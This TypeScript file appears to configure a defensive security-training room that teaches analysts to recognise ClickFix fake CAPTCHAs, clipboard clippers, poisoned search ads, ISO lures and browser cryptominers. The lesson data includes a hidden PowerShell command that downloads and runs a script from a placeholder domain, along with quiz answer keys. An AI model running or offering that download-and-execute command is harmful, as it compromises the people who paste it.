import type { RoomExperience } from "./types";

// "Operation Bait Shop" for the "commodity-initial-access" room.
// Script: docs/campaign/21-commodity-initial-access.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Brennan & Lowe Architects (fictional), not the graded tasks' NexaCorp. Lab
// data differs from the graded tasks: the ClickFix labs read the lure page and
// the RunMRU key, never an EDR process event without a file_create (q1) or the
// Chocolatey install (ac1); the clipper sheet compares addresses, it doesn't
// pick an investigation step (q2); the search-results lab is WinSCP, not la1's
// 7zSetup or cdn-pkg-mirror19.net; the MOTW console is a patched host, not
// q3's unpatched one; the Stratum drill reads mining messages, not la2's
// WebSocket session or its relay IP (f1) or q4's symptoms; and nothing maps
// IDs (m1) or orders triage (o1).
export const COMMODITY_INITIAL_ACCESS: RoomExperience = {
  roomId: "commodity-initial-access",
  codename: "Operation Bait Shop",
  theme: "lures",
  handler: { name: "Yara Nasser", role: "Threat Intelligence Analyst, Brennan & Lowe Architects" },
  briefing: [
    "Brennan & Lowe Architects. 300 staff, big CAD files, and a habit of searching the web for free tools.",
    "In 2022 Office stopped running macros from the internet. Attackers didn't stop; they changed the bait.",
    "Yara Nasser tracks what the bait looks like now: a CAPTCHA that types a command, a clipboard that lies, a sponsored link, a disc image, a tab that mines.",
    "Walk the bait shop, and learn to recognise each lure before someone takes it.",
  ],
  mission: "See why macros stopped working, take apart a fake CAPTCHA and find its command in RunMRU, spot a swapped wallet address, pick the real download from poisoned search results, check Mark-of-the-Web with PowerShell, and read a browser miner's Stratum messages.",
  estimate: "~55 min",
  look: { primary: "#a3e635", secondary: "#f472b6", warn: "#f43f5e" },
  scene: "baitshop",
  layout: "stage",
  story: {
    intro: { title: "They Changed the Bait", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/commodity-initial-access/baitshop-intro-e93b78b0.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/commodity-initial-access/baitshop-intro-8e74e04a.jpg" },
    afterStation: {
      clickfix: { title: "Win+R, Ctrl+V, Enter", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/commodity-initial-access/baitshop-ch2-4157a285.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/commodity-initial-access/baitshop-ch2-098a938f.jpg" },
      seo: { title: "Sponsored, Mounted, Trusted", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/commodity-initial-access/baitshop-ch3-4b27a9c9.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/commodity-initial-access/baitshop-ch3-f188e938.jpg" },
      miner: { title: "The Tab That Mines", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/commodity-initial-access/baitshop-finale-98601c55.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/commodity-initial-access/baitshop-finale-7b8715b8.jpg" },
    },
  },
  stations: [
    {
      id: "macros",
      label: "After Macros",
      topic: "Why the 2022 macro block moved attackers to new delivery",
      tagline: "See the mark that blocks a macro",
      building: "archive",
      taskIds: ["mcia-r1"],
    },
    {
      id: "clickfix",
      label: "The Fake CAPTCHA",
      topic: "ClickFix: paste-and-run through the Run dialog (T1204.004)",
      tagline: "Take the lure apart, then find what it made the user run",
      building: "lab",
      taskIds: ["mcia-r2", "mcia-q1", "mcia-ac1"],
    },
    {
      id: "clipper",
      label: "The Lying Clipboard",
      topic: "Clipboard clippers and look-alike wallet addresses (T1115)",
      tagline: "Compare what was copied with what was pasted",
      building: "vault",
      taskIds: ["mcia-r3", "mcia-q2"],
    },
    {
      id: "seo",
      label: "The Sponsored Result",
      topic: "SEO poisoning and malvertising (T1608.006) · fake installers as loaders",
      tagline: "Pick the real download from the search page",
      building: "office",
      taskIds: ["mcia-r4", "mcia-la1"],
    },
    {
      id: "iso",
      label: "The Disc Image",
      topic: "ISO/IMG containers and Mark-of-the-Web (T1553.005)",
      tagline: "Check the zone mark with PowerShell",
      building: "control",
      taskIds: ["mcia-r5", "mcia-q3"],
    },
    {
      id: "miner",
      label: "The Mining Tab",
      topic: "Drive-by browser cryptomining · WebAssembly · Stratum relays (T1496)",
      tagline: "Read what a browser miner says to its pool",
      building: "ticket",
      taskIds: ["mcia-r6", "mcia-la2", "mcia-f1", "mcia-q4", "mcia-m1", "mcia-o1"],
      boss: true,
    },
  ],
  personas: {
    "mcia-q1": { name: "Yara Nasser", role: "Threat Intelligence Analyst", line: "explorer.exe started PowerShell, and there's no file_create before it. What does that tell you?" },
    "mcia-q2": { name: "Yara Nasser", role: "Threat Intelligence Analyst", line: "A payment went to the wrong wallet. What do we look for on the laptop?" },
    "mcia-q3": { name: "Yara Nasser", role: "Threat Intelligence Analyst", line: "Old Windows 10, a shortcut inside a mounted ISO, and no SmartScreen warning. Why not?" },
    "mcia-q4": { name: "Yara Nasser", role: "Threat Intelligence Analyst", line: "'My laptop's running hot', nothing downloaded, nothing odd in Task Manager. Which lure?" },
    "mcia-ac1": { name: "Yara Nasser", role: "Threat Intelligence Analyst", line: "Hidden PowerShell from explorer.exe on a DevOps box. It looks like ClickFix. Is it?" },
  },
  briefings: {
    // ── Reading 1: life after macros ──
    "mcia-r1": [
      {
        kind: "worksheet",
        title: "Why the Macro Didn't Run",
        prompt: "A phishing email delivered Fee_Proposal.docm to an architect. Word refused to run its macro. Here's what Word and the file system saw.",
        caption: "Fee_Proposal.docm · Properties and Word's message bar",
        columns: ["where", "what it shows"],
        rows: [
          ["Word message bar", "SECURITY RISK: Microsoft has blocked macros from running because the source of this file is untrusted."],
          ["File Properties > General", "This file came from another computer and might be blocked to help protect this computer."],
          ["Zone.Identifier stream", "[ZoneTransfer] ZoneId=3 HostUrl=https://mail-attach.example/dl/88c1"],
          ["Group Policy", "Block macros from running in Office files from the Internet: Enabled (default since 2022)"],
        ],
        questions: [
          { id: "zone", q: "Which ZoneId marks a file as coming from the internet?", hint: "Zone.Identifier row.", answer: ["3"], why: "ZoneId=3 is the Internet zone. That mark, Mark-of-the-Web, is what Office checks before blocking the macro." },
          { id: "host", q: "Which host did the file come from?", hint: "HostUrl.", answer: ["mail-attach.example"], why: "The download source is recorded with the mark: useful for blocking and scoping." },
          { id: "next", q: "With macros blocked, do attackers need users to open documents at all? (yes/no)", hint: "Think of the five lures in this room.", answer: ["no"], why: "They moved to things that never needed a macro: pasted commands, fake installers, disc images, browser tabs." },
        ],
      },
    ],
    // ── Reading 2: ClickFix ──
    "mcia-r2": [
      {
        kind: "hotspot",
        title: "Take the Lure Apart",
        prompt: "A designer landed on this page while downloading a free font. Click the parts that give it away.",
        artifact: "fonts-free-download.example/verify",
        parts: [
          { id: "url", text: "https://fonts-free-download.example/verify", flag: true, note: "A 'verification' page on the font site itself, not on any CAPTCHA provider's domain.", style: "url" },
          { id: "title", text: "Verify you are human", flag: false, note: "A normal title. Real and fake CAPTCHAs both say this.", style: "subject" },
          { id: "steps", text: "To continue: 1. Press Windows + R  2. Press Ctrl + V  3. Press Enter", flag: true, note: "No real CAPTCHA ever asks you to open the Run dialog. This is the whole attack.", style: "body" },
          { id: "box", text: "I'm not a robot", flag: false, note: "Looks like the real widget. Clicking it is what copies the command.", style: "button" },
          { id: "clip", text: "(clipboard, invisible) powershell -w h -c \"iwr https://cdn-fontsync.example/v.ps1 | iex\"", flag: true, note: "Copied to the clipboard by the page's JavaScript. The user never sees it before pasting.", style: "meta" },
        ],
      },
      {
        kind: "terminal",
        title: "What Did They Paste?",
        prompt: "The designer pressed Enter. Windows remembers what is typed into the Run dialog. Check the RunMRU key on their workstation.",
        shell: "cmd",
        host: "C:\\Users\\l.okonkwo>",
        commands: [
          { match: "reg\\s+query\\s+\"?hkcu\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\explorer\\\\runmru\"?", help: "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU     the Run dialog's history",
            output: "\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\n    a    REG_SZ    powershell -w h -c \"iwr https://cdn-fontsync.example/v.ps1 | iex\"\\1\n    b    REG_SZ    calc\\1\n    MRUList    REG_SZ    ab\n" },
        ],
        objectives: [
          { id: "last", task: "Which RunMRU entry was used most recently? (letter)", hint: "MRUList lists entries most recent first.", answer: ["a"], why: "MRUList 'ab': entry a is the latest. The trailing \\1 is just how Windows stores Run history." },
          { id: "dom", task: "From which domain does the pasted command fetch its script?", hint: "Read entry a.", answer: ["cdn-fontsync.example"], why: "iwr downloads the script and iex runs it in memory. Block the domain and search for it fleet-wide." },
          { id: "flag", task: "Which PowerShell flag hid the window?", hint: "Short form of -WindowStyle Hidden.", answer: ["-w h", "-w", "-w hidden", "-windowstyle hidden"], why: "-w h: no console window, so the user saw nothing happen after pressing Enter." },
        ],
      },
    ],
    // ── Reading 3: clippers ──
    "mcia-r3": [
      {
        kind: "worksheet",
        title: "Copied vs Pasted",
        prompt: "The finance team pays a contractor in USDT. Clipboard telemetry from the payer's laptop shows what was copied and what was pasted into the wallet app, two seconds apart.",
        caption: "EDR clipboard events · FIN-LT-0044 · 14:20",
        columns: ["time", "event", "value"],
        rows: [
          ["14:20:31", "copy (from contractor's invoice PDF)", "TQ7n4Kx9Lm2PwVr8sYdEa3hZ6uFb1cG5jR"],
          ["14:20:33", "paste (into wallet app)", "TQ7n9Hq2Zd5BxWc4tMkNy8eLr3pVa1cG5jR"],
        ],
        questions: [
          { id: "first", q: "Do the first four characters match? (yes/no)", hint: "TQ7n...", answer: ["yes"], why: "Clippers pick attacker addresses that share the start and the end, because that's all most people check." },
          { id: "last", q: "Do the last four characters match? (yes/no)", hint: "...G5jR", answer: ["yes"], why: "Same trick at the end. The middle is completely different." },
          { id: "same", q: "Is the pasted address the one that was copied? (yes/no)", hint: "Compare the middle.", answer: ["no"], why: "Swapped in two seconds, with no window and no network traffic. Verify every character, or use an address book that can't be pasted over." },
        ],
      },
    ],
    // ── Reading 4: SEO poisoning ──
    "mcia-r4": [
      {
        kind: "hotspot",
        title: "Which Result Is Real?",
        prompt: "An architect searched 'winscp download'. Click the results that should not be trusted.",
        artifact: "Search results: winscp download",
        parts: [
          { id: "ad", text: "Sponsored · winscp-download.example · WinSCP Official Download 2026 · Free & Safe", flag: true, note: "A paid slot on a look-alike domain. 'Official' in an ad means nothing.", style: "url" },
          { id: "ad2", text: "Sponsored · get-winscp.example · Fast mirror, no registration", flag: true, note: "A second ad, another look-alike. Attackers buy several.", style: "url" },
          { id: "real", text: "winscp.net · WinSCP: Free SFTP, SCP, S3 and FTP client for Windows", flag: false, note: "The project's real site, in the organic results below the ads.", style: "url" },
          { id: "wiki", text: "en.wikipedia.org · WinSCP", flag: false, note: "An encyclopedia page, which links to the official site.", style: "url" },
        ],
      },
    ],
    // ── Reading 5: ISO and MOTW ──
    "mcia-r5": [
      {
        kind: "terminal",
        title: "Check the Mark",
        prompt: "Drawings_Pack.iso was downloaded on a fully patched Windows 11 laptop and mounted as E:. Check which files carry Mark-of-the-Web.",
        shell: "powershell",
        host: "PS C:\\Users\\a.brennan\\Downloads>",
        commands: [
          { match: "get-item\\s+.*drawings_pack\\.iso\\s+-stream\\s+\\*", help: "Get-Item .\\Drawings_Pack.iso -Stream *               list the file's data streams",
            output: "Stream          Length\n------          ------\n:$DATA        4194304\nZone.Identifier    112" },
          { match: "get-content\\s+.*drawings_pack\\.iso\\s+-stream\\s+zone\\.identifier", help: "Get-Content .\\Drawings_Pack.iso -Stream Zone.Identifier   read the mark",
            output: "[ZoneTransfer]\nZoneId=3\nReferrerUrl=https://cad-blocks-free.example/\nHostUrl=https://cad-blocks-free.example/files/Drawings_Pack.iso" },
          { match: "get-item\\s+e:\\\\.*\\.lnk\\s+-stream\\s+\\*", help: "Get-Item E:\\Drawings.lnk -Stream *                      the shortcut inside the mounted disc",
            output: "Stream          Length\n------          ------\n:$DATA           2048\nZone.Identifier     82" },
          { match: "get-content\\s+e:\\\\.*\\.lnk\\s+-stream\\s+zone\\.identifier", help: "Get-Content E:\\Drawings.lnk -Stream Zone.Identifier",
            output: "[ZoneTransfer]\nZoneId=3" },
        ],
        objectives: [
          { id: "iso", task: "What ZoneId does the ISO carry?", hint: "Get-Content .\\Drawings_Pack.iso -Stream Zone.Identifier", answer: ["3"], why: "Internet zone, set by the browser when it saved the file." },
          { id: "src", task: "Which site served the ISO?", hint: "HostUrl or ReferrerUrl.", answer: ["cad-blocks-free.example"], why: "A 'free CAD blocks' site: bait aimed squarely at architects." },
          { id: "lnk", task: "On this patched laptop, does the shortcut inside the disc carry the mark too? (yes/no)", hint: "Get-Item E:\\Drawings.lnk -Stream *", answer: ["yes"], why: "Since the November 2022 update, Windows passes the mark on to files inside a mounted disc, so SmartScreen and Office checks still apply. Unpatched machines are the ones that lose it." },
        ],
      },
    ],
    // ── Reading 6: browser mining ──
    "mcia-r6": [
      {
        kind: "anatomy",
        title: "Anatomy of a Stratum Message",
        prompt: "Brennan & Lowe's proxy decrypts traffic to uncategorised sites. This is what a browser miner sent to its relay, one message at a time.",
        source: "Proxy · decrypted WebSocket frames · tab on render-tools-free.example",
        fields: [
          { key: "frame 1", value: "{\"id\":1,\"method\":\"mining.subscribe\",\"params\":[\"webminer/2.1\"]}", label: "Hello", note: "Stratum is the JSON-RPC protocol miners use to talk to pools. 'subscribe' opens the session." },
          { key: "frame 2", value: "{\"id\":2,\"method\":\"mining.authorize\",\"params\":[\"47TmThKXvEsXtZCZaGs11QeU5AsqFFm3UpryTgV3NbYm8iQ2Apu68t2WBcoNSYACj3XxuG5rDEktzjqqzeo58cXcuRDNAyb.blw\",\"x\"]}", label: "Whose wallet", note: "The username is a Monero wallet address (made up for training): the miner's earnings go there, not to the site." },
          { key: "frame 3 (from pool)", value: "{\"method\":\"job\",\"params\":{\"job_id\":\"7f2a\",\"target\":\"b88d0600\",\"algo\":\"rx/0\"}}", label: "Work", note: "rx/0 is RandomX, Monero's CPU-friendly algorithm, which is why it runs in a browser at all." },
          { key: "frame 4", value: "{\"id\":4,\"method\":\"mining.submit\",\"params\":[\"7f2a\",\"0000a3f1\",\"e4b0...\"]}", label: "Results", note: "A found share sent back. These repeat every few seconds for as long as the tab is open." },
          { key: "source", value: "WebAssembly module wasm-rx.wasm loaded by a third-party analytics script", label: "Where it ran", note: "No file in Downloads, no new process: just the browser's renderer." },
        ],
        summary: "Subscribe, authorise with a wallet, take jobs, submit shares: the conversation of a miner, inside an ordinary tab.",
      },
    ],
  },
};
